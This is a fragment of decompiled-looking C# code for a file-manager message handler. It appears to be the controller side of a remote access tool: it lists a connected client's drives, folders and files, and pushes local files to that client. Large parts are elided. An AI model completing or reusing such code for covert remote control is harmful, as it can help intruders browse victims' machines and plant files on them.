	...
	public async void FileManager(Clients client, MsgPack unpack_msgpack)
	{
		try
		{
			...
			case "getDrivers":
			{
				...
				formFileManager3.listViewExplorer.Items.Clear();
				...
				for (num = 0; num < array.Length; num++)
				{
					if (array[num].Length > 0)
					{
						...
						formFileManager3.listViewExplorer.Items.Add(listViewItem);
					}
					num++;
				}
				break;
			...
			case "getPath":
			{
				...
				if (FM != null)
				{
					...
					FM.listViewExplorer.BeginUpdate();
					FM.listViewExplorer.Items.Clear();
					...
					FM.listViewExplorer.Groups.Clear();
					...
					FM.listViewExplorer.Groups.Add(groupFolder);
					FM.listViewExplorer.Groups.Add(groupFile);
					ListView.ListViewItemCollection items = FM.listViewExplorer.Items;
					items.AddRange(await Task.Run(() => GetFolders(unpack_msgpack, groupFolder).ToArray()));
					items = FM.listViewExplorer.Items;
					items.AddRange(await Task.Run(() => GetFiles(unpack_msgpack, groupFile, FM.imageList1).ToArray()));
					FM.listViewExplorer.Enabled = true;
					FM.listViewExplorer.Focus();
					FM.listViewExplorer.EndUpdate();
					FM.toolStripStatusLabel2.Text = $"       Folder[{FM.listViewExplorer.Groups[0].Items.Count}]   Files[{FM.listViewExplorer.Groups[1].Items.Count}]";
				}
				break;
			}
			case "reqUploadFile":
			{
				FormDownloadFile formDownloadFile = (FormDownloadFile)Application.OpenForms[unpack_msgpack.ForcePathObject("ID").AsString];
				if (formDownloadFile != null)
				{
					...
					msgPack.ForcePathObject("File").LoadFileAsBytes(formDownloadFile.FullFileName);
					msgPack.ForcePathObject("Name").AsString = formDownloadFile.ClientFullFileName;
					ThreadPool.QueueUserWorkItem(formDownloadFile.Send, msgPack.Encode2Bytes());
				}
				break;
			}
			case "error":
			{
				...
				{
					formFileManager.listViewExplorer.Enabled = true;
